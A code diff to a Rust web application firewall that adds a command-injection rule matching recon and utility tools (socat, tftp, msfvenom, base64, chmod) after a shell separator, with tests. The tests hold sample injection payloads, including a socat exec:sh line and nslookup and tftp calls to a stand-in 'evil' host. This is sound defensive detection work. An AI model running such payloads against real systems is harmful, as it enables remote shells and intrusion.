@@ -1159,6 +1159,14 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "cmdi_shell_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(cat|ls|id|whoami|uname|wget|curl|ncat|nc|bash|sh|python|perl|powershell|cmd)\b" },
 		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
 		Rule { id: "cmdi_command_substitution", category: WafCategory::CommandInjection, pattern: r"(?i)\$\(\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|env|echo|printf)\b" },
+		// Network-recon / exfil clients and dangerous file/privilege utilities past the core
+		// `cmdi_shell_command` set (OWASP-CRS 932xxx command list). Same leading-separator anchor
+		// (`;`/`&`/`|`/backtick/`$` then optional whitespace) as `cmdi_shell_command`, which is the
+		// false-positive guard: a bare `dig`/`base64`/`fetch` in prose stays clean, but one riding a
+		// shell separator (`; nslookup evil`, `| base64 -d`, `` `socat …` ``) is near-always
+		// injection. Command names are disjoint from `cmdi_shell_command` so a hit never
+		// double-counts in anomaly scoring. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_recon_and_utility", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(nslookup|dig|telnet|tftp|socat|scp|ssh|ftp|lynx|fetch|chmod|chown|crontab|mkfifo|mknod|base64|xxd|msfvenom|busybox)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
 		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
 		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
@@ -1628,6 +1636,35 @@ mod tests {
 		assert_eq!(m.category, WafCategory::CommandInjection);
 		assert_eq!(m.rule_id, "cmdi_shell_command");
 		assert_eq!(waf.inspect_str("cmd=/bin/sh -c whoami", "target").unwrap().rule_id, "cmdi_path_bin");
+	}
+
+	#[test]
+	fn recon_and_utility_commands_match() {
+		// Network-recon / exfil clients and dangerous utilities on a shell separator each attribute
+		// to the new rule (disjoint from `cmdi_shell_command`), so anomaly scoring never double-counts.
+		let waf = Waf::starter();
+		for payload in [
+			"host=1;nslookup evil.example",
+			"x=| base64 -d payload",
+			"y=`socat tcp:evil:1 exec:sh`",
+			"z=&chmod 777 /tmp/x",
+			"w=;tftp -g evil",
+			"v=$xxd -r dump",
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the recon/utility rule"));
+			assert_eq!(m.rule_id, "cmdi_recon_and_utility", "{payload}");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn recon_and_utility_commands_keep_false_positives_low() {
+		// The command words in prose or as ordinary path/query tokens — without a leading shell
+		// separator — must stay clean; the separator anchor is the guard.
+		let waf = Waf::starter();
+		for uri in ["/docs/how-to-use-ssh", "/blog/base64-explained", "/search?q=dig+into+data", "/tools/chmod-calculator"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
 	}
 
 	#[test]
